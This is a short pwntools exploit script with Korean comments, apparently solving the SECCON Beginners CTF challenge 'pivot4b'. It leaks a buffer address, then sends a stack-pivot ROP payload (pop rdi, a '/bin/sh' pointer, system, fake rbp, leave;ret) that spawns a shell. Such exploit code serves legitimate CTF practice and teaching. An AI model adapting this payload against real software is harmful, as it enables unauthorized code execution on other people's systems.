from pwn import *

p = process('./chall')
# p = remote("pivot4b.challenges.beginners.seccon.jp", 12300)
e = ELF('./chall')

p.recvuntil(b'message: ')
message = int(p.recvline().strip(), 16)
print(f"message buffer at : {hex(message)}")

system = 0x000000000040118d
leave_ret = 0x401211
pop_rdi = 0x40117a

ret =0x000000000040101a


# /bin/sh 문자열이 버퍼에서 시작하는 위치 계산
binsh_addr = message + 0x20  # pop_rdi 다음 위치

payload = p64(pop_rdi)           # 8 bytes: RDI 설정 가젯
payload += p64(binsh_addr)       # 8 bytes: /bin/sh 문자열 주소
payload += p64(ret)
payload += p64(system)           # 8 bytes: system 함수 주소  
payload += b"/bin/sh\x00"        # 8 bytes: /bin/sh 문자열
payload += cyclic(0x8)          # 16 bytes: 나머지 패딩 (0ex30 - 24 = 12, 16으로 조정)
payload += p64(message - 8)      # 8 bytes: fake rbp
payload += p64(leave_ret)        # 8 bytes: return address

p.sendafter(b'> ', payload)

p.interactive()